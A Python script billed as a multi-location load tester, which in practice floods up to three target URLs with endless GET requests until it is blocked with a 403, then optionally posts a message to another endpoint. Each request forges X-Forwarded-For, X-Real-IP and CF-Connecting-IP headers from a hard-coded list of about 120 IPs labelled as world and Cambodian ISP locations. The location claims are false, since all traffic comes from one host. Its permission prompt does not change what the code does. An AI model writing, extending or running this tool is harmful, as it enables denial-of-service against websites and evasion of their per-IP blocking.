
import asyncio
import aiohttp
import os
import sys
import time
import csv
import random
from statistics import mean
from datetime import datetime
from typing import Optional, List, Tuple
# uvloop import moved into main() for optional use

# ---------------- Colors & Styling ----------------
class C:
    B = '\033[1m'
    GREEN = '\033[92m'
    BRIGHT = '\033[1;32m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'

# ---------------- Globals ----------------
STOP = False
TOTAL_SENT = 0
LATENCIES: list[float] = []
LOG_ROWS: list[tuple] = []
START_TIME = 0.0

# ---------------- Location Data ----------------
LOCATIONS = [
    # Global locations from original data
    ("Australia, Sydney", "157.240.8.35"),
    ("Austria, Vienna", "57.144.244.1"),
    ("Brazil, Sao Paulo", "157.240.12.35"),
    ("Bulgaria, Sofia", "157.240.9.35"),
    ("Canada, Vancouver", "57.144.216.1"),
    ("Czechia, C.Budejovice", "157.240.30.35"),
    ("Finland, Helsinki", "31.13.72.36"),
    ("France, Paris", "157.240.202.35"),
    ("France, Roubaix", "163.70.128.35"),
    ("Germany, Frankfurt", "157.240.0.35"),
    ("Hong Kong, Hong Kong", "157.240.199.35"),
    ("Hungary, Nyiregyhaza", "157.240.253.35"),
    ("India, Mumbai", "163.70.144.35"),
    ("Indonesia, Jakarta", "157.240.208.35"),
    ("Israel, Netanya", "157.240.196.35"),
    ("Israel, Tel Aviv", "57.144.120.1"),
    ("Italy, Milan", "157.240.195.35"),
    ("Japan, Tokyo", "31.13.82.36"),
    ("Kazakhstan, Karaganda", "31.13.72.36"),
    ("Lithuania, Vilnius", "57.144.110.1"),
    ("Moldova, Chisinau", "185.60.218.35"),
    ("Netherlands, Amsterdam", "57.144.222.1"),
    ("Netherlands, Meppel", "157.240.201.35"),
    ("Poland, Poznan", "57.144.112.1"),
    ("Poland, Warsaw", "57.144.110.1"),
    ("Portugal, Viana", "157.240.5.35"),
    ("Russia, Moscow", "31.13.72.36"),
    ("Russia, Moscow", "57.144.244.1"),
    ("Serbia, Belgrade", "157.240.9.35"),
    ("Singapore, Singapore", "157.240.13.35"),
    ("Slovenia, Maribor", "31.13.84.36"),
    ("South Korea, Seoul", "31.13.82.36"),
    ("Spain, Madrid", "31.13.83.36"),
    ("Sweden, Tallberg", "31.13.72.36"),
    ("Switzerland, Zurich", "31.13.86.36"),
    ("Turkey, Gebze", "157.240.9.35"),
    ("Turkey, Istanbul", "157.240.9.35"),
    ("UK, Coventry", "163.70.151.35"),
    ("Ukraine, Khmelnytskyi", "57.144.112.1"),
    ("Ukraine, Kyiv", "157.240.224.35"),
    ("Ukraine, SpaceX Starlink", "57.144.110.1"),
    ("USA, Atlanta", "57.144.172.1"),
    ("USA, Dallas", "57.144.218.1"),
    ("USA, Los Angeles", "31.13.70.36"),
    ("USA, Miami", "31.13.67.35"),
    ("Vietnam, Ho Chi Minh City", "157.240.199.35"),
    
    # Cambodia locations - Major ISPs and providers
    ("Cambodia, Phnom Penh", "103.216.176.1"),
    ("Cambodia, Phnom Penh", "202.79.184.1"),
    ("Cambodia, Phnom Penh", "203.189.145.1"),
    ("Cambodia, Phnom Penh", "103.205.244.1"),
    ("Cambodia, Siem Reap", "103.216.178.1"),
    ("Cambodia, Siem Reap", "202.79.186.1"),
    ("Cambodia, Siem Reap", "203.189.147.1"),
    ("Cambodia, Battambang", "103.216.180.1"),
    ("Cambodia, Battambang", "202.79.188.1"),
    ("Cambodia, Sihanoukville", "103.216.182.1"),
    ("Cambodia, Sihanoukville", "202.79.190.1"),
    ("Cambodia, Pursat", "103.216.184.1"),
    ("Cambodia, Kampong Cham", "103.216.186.1"),
    ("Cambodia, Kampong Cham", "202.79.192.1"),
    ("Cambodia, Kampong Thom", "103.216.188.1"),
    ("Cambodia, Kampong Speu", "103.216.190.1"),
    ("Cambodia, Takeo", "103.216.192.1"),
    ("Cambodia, Kratie", "103.216.194.1"),
    ("Cambodia, Kampot", "103.216.196.1"),
    ("Cambodia, Koh Kong", "103.216.198.1"),
    ("Cambodia, Prey Veng", "103.216.200.1"),
    ("Cambodia, Svay Rieng", "103.216.202.1"),
    ("Cambodia, Stung Treng", "103.216.204.1"),
    ("Cambodia, Ratanakiri", "103.216.206.1"),
    ("Cambodia, Mondulkiri", "103.216.208.1"),
    ("Cambodia, Pailin", "103.216.210.1"),
    ("Cambodia, Tboung Khmum", "103.216.212.1"),
    ("Cambodia, Kep", "103.216.214.1"),
    ("Cambodia, Oddar Meanchey", "103.216.216.1"),
    ("Cambodia, Preah Vihear", "103.216.218.1"),
    ("Cambodia, Kandal", "103.216.220.1"),
    ("Cambodia, Kampong Chhnang", "103.216.222.1"),
    ("Cambodia, Banteay Meanchey", "103.216.224.1"),
    ("Cambodia, Pursat", "202.79.194.1"),
    ("Cambodia, Kampong Thom", "202.79.196.1"),
    ("Cambodia, Kampong Speu", "202.79.198.1"),
    ("Cambodia, Takeo", "202.79.200.1"),
    ("Cambodia, Kratie", "202.79.202.1"),
    ("Cambodia, Kampot", "202.79.204.1"),
    ("Cambodia, Koh Kong", "202.79.206.1"),
    ("Cambodia, Prey Veng", "202.79.208.1"),
    ("Cambodia, Svay Rieng", "202.79.210.1"),
    ("Cambodia, Stung Treng", "202.79.212.1"),
    ("Cambodia, Ratanakiri", "202.79.214.1"),
    ("Cambodia, Mondulkiri", "202.79.216.1"),
    ("Cambodia, Pailin", "202.79.218.1"),
    ("Cambodia, Tboung Khmum", "202.79.220.1"),
    ("Cambodia, Kep", "202.79.222.1"),
    ("Cambodia, Oddar Meanchey", "202.79.224.1"),
    ("Cambodia, Preah Vihear", "202.79.226.1"),
    ("Cambodia, Kandal", "202.79.228.1"),
    ("Cambodia, Kampong Chhnang", "202.79.230.1"),
    ("Cambodia, Banteay Meanchey", "202.79.232.1"),
    ("Cambodia, Phnom Penh (Cellcard)", "103.47.144.1"),
    ("Cambodia, Siem Reap (Cellcard)", "103.47.146.1"),
    ("Cambodia, Battambang (Cellcard)", "103.47.148.1"),
    ("Cambodia, Sihanoukville (Cellcard)", "103.47.150.1"),
    ("Cambodia, Phnom Penh (Smart)", "103.253.104.1"),
    ("Cambodia, Siem Reap (Smart)", "103.253.106.1"),
    ("Cambodia, Battambang (Smart)", "103.253.108.1"),
    ("Cambodia, Phnom Penh (Metfone)", "113.190.224.1"),
    ("Cambodia, Siem Reap (Metfone)", "113.190.226.1"),
    ("Cambodia, Battambang (Metfone)", "113.190.228.1"),
    ("Cambodia, Phnom Penh (SEATEL)", "43.245.64.1"),
    ("Cambodia, Siem Reap (SEATEL)", "43.245.66.1"),
    ("Cambodia, Phnom Penh (QB)", "103.31.200.1"),
    ("Cambodia, Siem Reap (QB)", "103.31.202.1"),
    ("Cambodia, Phnom Penh (Sinet)", "103.28.56.1"),
    ("Cambodia, Siem Reap (Sinet)", "103.28.58.1"),
    ("Cambodia, Phnom Penh (Ezecom)", "202.78.172.1"),
    ("Cambodia, Siem Reap (Ezecom)", "202.78.174.1"),
    ("Cambodia, Phnom Penh (Opennet)", "103.233.120.1"),
    ("Cambodia, Siem Reap (Opennet)", "103.233.122.1"),
    ("Cambodia, Phnom Penh (Digi)", "103.149.112.1"),
    ("Cambodia, Siem Reap (Digi)", "103.149.114.1"),
    ("Cambodia, Phnom Penh (Telcotech)", "103.6.152.1"),
    ("Cambodia, Siem Reap (Telcotech)", "103.6.154.1"),
    ("Cambodia, Phnom Penh (WiCam)", "103.209.216.1"),
    ("Cambodia, Siem Reap (WiCam)", "103.209.218.1"),
]

# ---------------- Professional Logo ----------------
def clear():
    os.system("cls" if os.name == "nt" else "clear")

def pro_logo():
    clear()
    logo_lines = [
        " ██████╗  ██╗   ██╗██████╗  ██████╗ ████████╗███████╗",
        "██╔═══██╗ ██║   ██║██╔══██╗██╔═══██╗╚══██╔══╝██╔════╝",
        "██║   ██║ ██║   ██║██████╔╝██║   ██║   ██║   █████╗  ",
        "██║▄▄ ██║ ██║   ██║██╔══██╗██║   ██║   ██║   ██╔══╝  ",
        "╚██████╔╝ ╚██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗",
        " ╚══▀▀═╝   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝",
    ]
    title = f"{C.CYAN}       Professional Multi-Location Load Tester{C.RESET}"
    byline = f"{C.YELLOW}By: Dyma — Permission-only stress & health tester{C.RESET}"
    for line in logo_lines:
        print(f"{C.BRIGHT}{C.GREEN}{line}{C.RESET}")
        time.sleep(0.01)
    print(title)
    print(byline)
    print()

# ---------------- Live Metrics Spinner ----------------
def spinner_task(update_interval=0.25):
    global STOP
    prev_sent = 0
    while not STOP:
        elapsed = max(1e-6, time.time() - START_TIME)
        sent = TOTAL_SENT
        rps = (sent - prev_sent) / update_interval if sent >= prev_sent else sent / elapsed
        prev_sent = sent
        avg_lat = (mean(LATENCIES) * 1000) if LATENCIES else 0.0
        sys.stdout.write(
            f"\r{C.GREEN}● Running {C.RESET}"
            f"{C.YELLOW} Sent: {sent} | RPS (recent): {rps:7.1f} | Avg Latency: {avg_lat:6.2f} ms{C.RESET}"
        )
        sys.stdout.flush()
        time.sleep(update_interval)
    # final newline on stop
    print()

# ---------------- Logging Helper ----------------
def log_row(location: str, status: Optional[int], latency: Optional[float], ip: str, target: str):
    ts = datetime.utcnow().isoformat() + "Z"
    LOG_ROWS.append((ts, location, status if status is not None else "", 
                    f"{latency:.6f}" if latency is not None else "", ip, target))

def write_csv(path="multi_location_load_test_log.csv"):
    header = ("timestamp", "location", "status", "latency_sec", "ip_address", "target_url")
    try:
        with open(path, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(header)
            writer.writerows(LOG_ROWS)
        print(f"{C.CYAN}Log written to {path}{C.RESET}")
    except Exception as e:
        print(f"{C.RED}Failed to write CSV log: {e}{C.RESET}")

# ---------------- Core Request Logic ----------------
async def send_request(session: aiohttp.ClientSession, seq: int, target: str, 
                      location: str, ip: str, timeout_s: float = 10.0):
    """
    Performs a single GET request from a specific location, records latency/status.
    Stops globally when 403 detected (sets STOP).
    """
    global STOP, TOTAL_SENT
    if STOP:
        return

    try:
        headers = {
            'X-Forwarded-For': ip,
            'X-Real-IP': ip,
            'CF-Connecting-IP': ip,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        start = time.perf_counter()
        async with session.get(target, headers=headers, timeout=timeout_s) as resp:
            latency = time.perf_counter() - start
            status = resp.status
            TOTAL_SENT += 1
            LATENCIES.append(latency)
            log_row(location, status, latency, ip, target)

            # Stop only on 403 (as requested)
            if status == 403:
                print(f"\n{C.RED}→ Received 403 from {location} ({ip}) at request #{seq}. Initiating stop...{C.RESET}")
                STOP = True
    except asyncio.TimeoutError:
        TOTAL_SENT += 1
        log_row(location, None, 0.0, ip, target)
    except Exception as e:
        TOTAL_SENT += 1
        log_row(location, None, 0.0, ip, target)
        # Any unexpected exception will also stop to be safe
        print(f"\n{C.RED}→ Exception on request #{seq} from {location}: {e}{C.RESET}")
        STOP = True

# ---------------- Flood Orchestrator ----------------
async def flood_forever(targets: list, concurrency: int, ramp_seconds: int = 0):
    """
    Runs continuous requests from random locations to random targets until STOP is triggered.
    """
    global STOP
    
    # Use faster DNS resolver and optimized connection pool
    connector = aiohttp.TCPConnector(
        limit=concurrency, 
        limit_per_host=concurrency,
        ttl_dns_cache=300,
        use_dns_cache=True,
        force_close=True,  # Avoid keeping connections open
        enable_cleanup_closed=True  # Clean up closed connections
    )
    
    # Set aggressive timeouts
    timeout = aiohttp.ClientTimeout(
        total=15,
        connect=5,
        sock_connect=5,
        sock_read=5
    )
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        seq = 1
        
        # Pre-calculate all possible (target, location, ip) combinations
        target_location_combinations = []
        for target in targets:
            for location, ip in LOCATIONS:
                target_location_combinations.append((target, location, ip))
        
        # Main loop: keep sending requests from random locations to random targets until STOP
        while not STOP:
            # Select a random target and location for each request
            target, location, ip = random.choice(target_location_combinations)
            await send_request(session, seq, target, location, ip)
            seq += 1
            
            # No delay for maximum speed - let the connection pool handle it
            # This will create backpressure naturally when the pool is full

# ---------------- Follow-up Message Sender ----------------
async def send_followup(method: str, endpoint: str, message: str, session: aiohttp.ClientSession):
    """
    Sends a custom follow-up message after 403 is detected.
    method: "POST" or "GET"
    endpoint: absolute URL
    message: text payload
    """
    try:
        if method.upper() == "POST":
            async with session.post(endpoint, json={"message": message}, timeout=10) as resp:
                return resp.status, await resp.text()
        else:  # GET
            params = {"message": message}
            async with session.get(endpoint, params=params, timeout=10) as resp:
                return resp.status, await resp.text()
    except Exception as e:
        return None, str(e)

# ---------------- Entry / CLI ----------------
def prompt_yesno(prompt: str) -> bool:
    ans = input(prompt + " ").strip().lower()
    return ans in ("y", "yes")

def get_targets():
    """Get up to 3 target URLs from user input"""
    targets = []
    for i in range(3):
        target = input(f"{C.GREEN}Target URL {i+1} (include https://, or leave empty to finish): {C.RESET}").strip()
        if not target:
            if i == 0:
                print(f"{C.RED}At least one target URL is required.{C.RESET}")
                continue
            break
        if not target.lower().startswith(("http://", "https://")):
            print(f"{C.RED}Please provide a full URL with scheme (http/https).{C.RESET}")
            continue
        targets.append(target)
        if len(targets) >= 3:
            break
    return targets

def main():
    global START_TIME, STOP

    # Use uvloop for faster async I/O if available
    try:
        import uvloop
        asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
        print(f"{C.CYAN}Using ultra-fast uvloop for maximum performance{C.RESET}")
    except (ImportError, ModuleNotFoundError):
        print(f"{C.YELLOW}For even better performance, install uvloop: pip install uvloop{C.RESET}")

    pro_logo()
    print(f"{C.YELLOW}⚠ WARNING: Run tests only on targets you own or have explicit permission to test.{C.RESET}")
    has_perm = prompt_yesno(f"{C.CYAN}Do you confirm you have permission to test the target? (yes/no):{C.RESET}")
    if not has_perm:
        print(f"{C.RED}Permission not confirmed. Aborting.{C.RESET}")
        sys.exit(1)

    targets = get_targets()
    if not targets:
        print(f"{C.RED}No valid targets provided. Aborting.{C.RESET}")
        sys.exit(1)

    try:
        concurrency = int(input(f"{C.GREEN}Concurrency (parallel requests, e.g. 100): {C.RESET}") or "100")
        concurrency = max(1, min(concurrency, 1000))  # Allow higher concurrency
    except Exception:
        print(f"{C.RED}Invalid concurrency. Using 100.{C.RESET}")
        concurrency = 100

    log_choice = prompt_yesno(f"{C.CYAN}Enable CSV logging? (recommended) (yes/no):{C.RESET}")
    csv_path = "multi_location_load_test_log.csv" if log_choice else None

    # Follow-up message configuration (sent after 403)
    send_follow = prompt_yesno(f"{C.CYAN}After 403: send a custom message to a follow-up endpoint? (yes/no):{C.RESET}")
    follow_method = follow_endpoint = follow_message = None
    if send_follow:
        follow_method = input(f"{C.GREEN}Method (POST/GET) [{C.RESET}POST{C.GREEN}]: {C.RESET}").strip() or "POST"
        follow_endpoint = input(f"{C.GREEN}Follow-up endpoint URL (absolute): {C.RESET}").strip()
        follow_message = input(f"{C.GREEN}Message to send after 403 (short text): {C.RESET}").strip()

    print()
    print(f"{C.CYAN}Starting test → Targets: {', '.join(targets)} | Concurrency: {concurrency}{C.RESET}")
    print(f"{C.CYAN}Testing from {len(LOCATIONS)} global locations (including all Cambodian provinces){C.RESET}")
    print(f"{C.YELLOW}Press Ctrl+C to abort manually (will stop and write logs if enabled).{C.RESET}")
    print()

    # start spinner
    START_TIME = time.time()
    spinner_thread = None
    try:
        import threading
        spinner_thread = threading.Thread(target=spinner_task, daemon=True)
        spinner_thread.start()

        # run event loop with uvloop for maximum performance
        asyncio.run(flood_forever(targets, concurrency))
    except KeyboardInterrupt:
        print(f"\n{C.RED}User aborted (KeyboardInterrupt). Stopping...{C.RESET}")
        STOP = True
    finally:
        # ensure stop and print report
        STOP = True
        end_time = time.time()
        elapsed = end_time - START_TIME if START_TIME else 0.0
        print()
        print(f"{C.BRIGHT}{C.CYAN}--- Test Report ---{C.RESET}")
        print(f"Targets        : {', '.join(targets)}")
        print(f"Total Requests : {TOTAL_SENT}")
        print(f"Elapsed        : {elapsed:.2f} s")
        avg_lat = mean(LATENCIES) * 1000 if LATENCIES else 0.0
        print(f"Avg Latency    : {avg_lat:.2f} ms")
        rps_overall = TOTAL_SENT / max(1e-6, elapsed)
        print(f"Avg Throughput : {rps_overall:.1f} req/sec")
        if csv_path and len(LOG_ROWS) > 0:
            write_csv(csv_path)

        # If we stopped because of 403 AND follow-up configured, send message
        if send_follow and follow_endpoint:
            print(f"\n{C.YELLOW}Sending follow-up message to {follow_endpoint} ...{C.RESET}")
            # create a small session to send the message
            try:
                async def _send_follow():
                    async with aiohttp.ClientSession() as s:
                        status, body = await send_followup(follow_method, follow_endpoint, follow_message, s)
                        return status, body
                s_status, s_body = asyncio.run(_send_follow())
                print(f"{C.CYAN}Follow-up response status: {s_status}{C.RESET}")
            except Exception as e:
                print(f"{C.RED}Failed to send follow-up: {e}{C.RESET}")

        print(f"\n{C.GREEN}All done. Stay legal and respectful — run tests responsibly.{C.RESET}")
        # small pause so spinner thread (if any) clears
        time.sleep(0.15)

if __name__ == "__main__":
    main()